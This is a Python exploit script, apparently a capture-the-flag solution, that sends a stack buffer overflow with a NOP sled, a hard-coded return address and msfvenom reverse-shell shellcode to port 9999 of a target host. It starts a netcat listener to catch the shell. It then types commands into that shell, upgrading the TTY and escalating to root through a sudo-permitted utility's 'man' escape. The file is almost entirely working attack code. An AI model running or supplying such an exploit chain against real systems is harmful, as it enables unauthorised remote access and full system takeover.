#!/usr/bin/env python 

#
#You need to cahnge keyboard layout to en.
#
#Create a new shell code with that instruction above the previuosly set one with
#youre ip and deserved port
#

from time import sleep
import os, subprocess, socket, sys, pyautogui

def enter():
    pyautogui.press('enter')

def BufferOverflow():

    host = str(sys.argv[1])
    port = 9999

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    sleep(1)
    print(s.recv(1024))
    print("exploiting...." + "\n")

    #sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=6989  -f py -b "\x00"
    buf = "\xdb\xc2\xba\xa3\x42\x59\x20\xd9\x74\x24\xf4\x5e\x29"
    buf += "\xc9\xb1\x12\x31\x56\x17\x03\x56\x17\x83\x4d\xbe\xbb"
    buf += "\xd5\xa0\xe4\xcb\xf5\x91\x59\x67\x90\x17\xd7\x66\xd4"
    buf += "\x71\x2a\xe8\x86\x24\x04\xd6\x65\x56\x2d\x50\x8f\x3e"
    buf += "\xa4\xa9\x4d\x2f\xd0\xaf\x91\x54\x6c\x39\x70\xda\x08"
    buf += "\x69\x22\x49\x66\x8a\x4d\x8c\x45\x0d\x1f\x26\x38\x21"
    buf += "\xd3\xde\xac\x12\x3c\x7c\x44\xe4\xa1\xd2\xc5\x7f\xc4"
    buf += "\x62\xe2\xb2\x87"

    #BadChars: \x00
    #RetAddress: 0x311712f3
    buffer = '\x90' * 524
    buffer += '\xf3\x12\x17\x31'
    buffer += '\x90' * 8
    buffer += buf

    print(":".join("{:02x}".format(ord(c)) for c in buffer))

    sleep(1)
    s.send(buffer)
    sleep(1)

    s.close()

pid = os.fork()

if pid > 0:
    os.system("nc -lvnp 6989")

elif pid == 0:

    subprocess.call("clear")
    BufferOverflow()        

    pyautogui.write("id")
    enter()

    pyautogui.write("script /dev/null -c bash")
    enter()

    pyautogui.write("sudo /home/anansi/bin/anansi_util manual man")
    enter()

    pyautogui.write("!")
    enter()

    pyautogui.write("id")
    enter()

else:
    print("Error")
